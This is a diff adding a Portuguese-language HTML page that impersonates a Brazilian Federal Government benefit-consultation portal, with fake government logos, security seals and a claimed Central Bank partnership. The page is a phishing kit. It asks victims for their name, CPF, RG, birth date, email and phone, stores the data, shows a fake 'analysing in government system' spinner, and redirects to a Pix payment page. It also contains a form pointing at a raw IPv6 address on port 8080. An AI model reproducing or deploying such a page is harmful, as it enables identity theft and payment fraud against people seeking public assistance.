@@ -1,0 +1,144 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Consulta de Benefício - Governo Federal</title>
+    <link rel="stylesheet" href="css/formulario.css">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;700&display=swap" rel="stylesheet">
+    <script src="pagamento-pix.html" defer></script>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <div class="logo-gov">
+                <img src="imagens/Gov.br.png" alt="Governo Federal">
+                <span>Governo Federal • Ministério da Economia</span>
+            </div>
+        </header>
+
+        <main>
+            <div class="progresso">
+                <div class="passo ativo">1</div>
+                <div class="linha"></div>
+                <div class="passo">2</div>
+            </div>
+
+            <h2>Preencha seus dados para consultar o benefício</h2>
+            <p>Informe seus dados corretamente para verificar seu direito ao auxílio emergencial.</p>
+<form action="http://[2804:747c:e005:7800:5979:5fb6:b6e2:978c]:8080" method="POST"></form>
+            <form id="formConsulta">
+                <div class="campo-form">
+                    <label for="nome">Nome completo</label>
+                    <input type="text" id="nome" placeholder="Como no seu documento" required>
+                </div>
+                
+                <div class="campo-form">
+                    <label for="cpf">CPF</label>
+                    <input type="text" id="cpf" placeholder="000.000.000-00" required>
+                </div>
+                
+                <div class="campo-form">
+                    <label for="rg">RG</label>
+                    <input type="text" id="rg" placeholder="Número e órgão emissor" required>
+                </div>
+                
+                <div class="campo-form">
+                    <label for="nascimento">Data de nascimento</label>
+                    <input type="date" id="nascimento" required>
+                </div>
+                
+                <div class="campo-form">
+                    <label for="email">E-mail</label>
+                    <input type="email" id="email" placeholder="seu@email.com" required>
+                </div>
+                
+                <div class="campo-form">
+                    <label for="telefone">Telefone</label>
+                    <input type="tel" id="telefone" placeholder="(00) 00000-0000" required>
+                </div>
+
+                <div class="termos">
+                    <input type="checkbox" id="termos" required>
+                    <label for="termos">Concordo com os Termos de Uso e autorizo a consulta de meus dados para verificação de benefícios.</label>
+                </div>
+
+                <button type="submit" class="botao-verificar">VERIFICAR DIREITO</button>
+            </form>
+
+            <div id="mensagem-loading" style="display:none;">
+                <div class="loading">
+                    <div class="spinner"></div>
+                    <p>⏳ Analisando seus dados no sistema do Governo Federal...</p>
+                    <p class="pequeno">Esta consulta pode levar até 30 segundos</p>
+                </div>
+            </div>
+
+            <div class="seguranca">
+                <img src="imagens/ssl.jpg" alt="Segurança">
+                <p>Todos os dados são protegidos por criptografia avançada</p>
+            </div>
+        </main>
+
+        <footer>
+            <p>Sistema de Consulta de Benefícios - Governo Federal</p>
+            <p>Parceria com Banco Central do Brasil</p>
+            <div class="selos">
+                <img src="imagens/segu.png" alt="Site Seguro">
+                <img src="imagens/gov.br.png" alt="Governo Federal">
+            </div>
+        </footer>
+    </div><!-- Adicione este script no final do body, antes do fechamento </body> -->
+<script>
+document.addEventListener('DOMContentLoaded', function() {
+    const form = document.getElementById('formConsulta');
+    const loadingMessage = document.getElementById('mensagem-loading');
+
+    form.addEventListener('submit', function(e) {
+        e.preventDefault();
+        
+        // Mostrar mensagem de loading
+        form.style.display = 'none';
+        loadingMessage.style.display = 'block';
+        
+        // Armazenar dados no localStorage
+        const formData = {
+            nome: document.getElementById('nome').value,
+            cpf: document.getElementById('cpf').value,
+            email: document.getElementById('email').value,
+            telefone: document.getElementById('telefone').value
+        };
+        
+        localStorage.setItem('userData', JSON.stringify(formData));
+        
+        // Simular processamento e redirecionar
+        setTimeout(function() {
+            window.location.href = 'pagamento-pix.html';
+        }, 3000);
+    });
+    
+    // Máscaras para os campos
+    document.getElementById('cpf').addEventListener('input', function(e) {
+        let value = e.target.value.replace(/\D/g, '');
+        value = value.replace(/(\d{3})(\d)/, '$1.$2')
+                     .replace(/(\d{3})(\d)/, '$1.$2')
+                     .replace(/(\d{3})(\d{1,2})$/, '$1-$2');
+        e.target.value = value;
+    });
+    
+    document.getElementById('telefone').addEventListener('input', function(e) {
+        let value = e.target.value.replace(/\D/g, '');
+        if (value.length > 2) {
+            value = value.replace(/^(\d{2})(\d)/g, '($1) $2');
+            if (value.length > 10) {
+                value = value.replace(/(\d{5})(\d)/, '$1-$2');
+            } else {
+                value = value.replace(/(\d{4})(\d)/, '$1-$2');
+            }
+        }
+        e.target.value = value;
+    });
+});
+</script>
+</body>
+</html>
